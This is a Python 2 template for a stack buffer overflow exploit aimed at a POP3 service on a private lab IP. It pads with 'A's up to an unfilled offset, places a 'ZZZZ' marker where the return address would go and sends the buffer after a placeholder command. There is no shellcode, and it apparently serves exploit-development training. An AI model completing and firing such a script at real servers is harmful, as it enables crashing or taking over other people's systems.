#!/usr/bin/python
import socket
import struct

#set up the IP and port to connect to
RHOST = "192.168.1.238" 
RPORT = 110

#set up the IP and port to connect to
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

data = s.recv(1024)

#build a message

buf_totlen= TOTAL LENGTH
offset_srp = OFFSET NUMBER

buf = ""
buf += "A"*(offset_srp - len(buf)) #padding
buf += "ZZZZ"
buf += "C"*(buf_totlen - len(buf)) #trailing padding
buf += "\n"

#send the message
s.send("VALUE" + buf)

#receive some data from socket
data = s.recv(1024)

s.close()
